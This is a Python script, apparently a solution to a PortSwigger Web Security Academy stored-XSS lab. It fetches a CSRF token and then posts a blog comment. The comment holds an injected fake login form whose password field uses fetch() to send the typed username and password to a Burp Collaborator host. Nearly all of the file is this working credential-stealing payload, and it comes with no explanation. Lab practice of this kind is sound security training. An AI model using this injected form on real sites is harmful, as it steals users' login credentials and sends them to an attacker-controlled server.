import requests
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from typing import Tuple, Text, Union
import bs4
from bs4 import BeautifulSoup



base_url = 'https://ace21fa71fb42775c0b1bea100f30088.web-security-academy.net/'

def scrape_csrf(url: Union[Text, bytes]) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


def post_comment(payload: str) -> str:
    token, cookies = scrape_csrf(urljoin(base_url, 'post?postId=2'))
    data = {
      'csrf': token,
      'postId': '4',
      'comment': payload,
      'name': 'abc',
      'email': 'bla@blub.invalid',
      'website': 'http://bla.invalid'
    }
    response = requests.post(urljoin(base_url, '/post/comment'), data=data, cookies=cookies)
    return response.content.decode('utf-8')


payload = """
<form class=login-form method="POST" action="/">
    <label>Username</label>
    <input required type=username id="usernamein" name="username">
    <label>Password</label>
    <input required type=password id="passwordin" name="password" onchange="if(this.value.length > 0) fetch('https://cwcrlzyuculx6nkyl05j4pl3buht5i.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
    <button class=button type=submit> Log in </button>
</form>
<script>
"""

print(post_comment(payload))
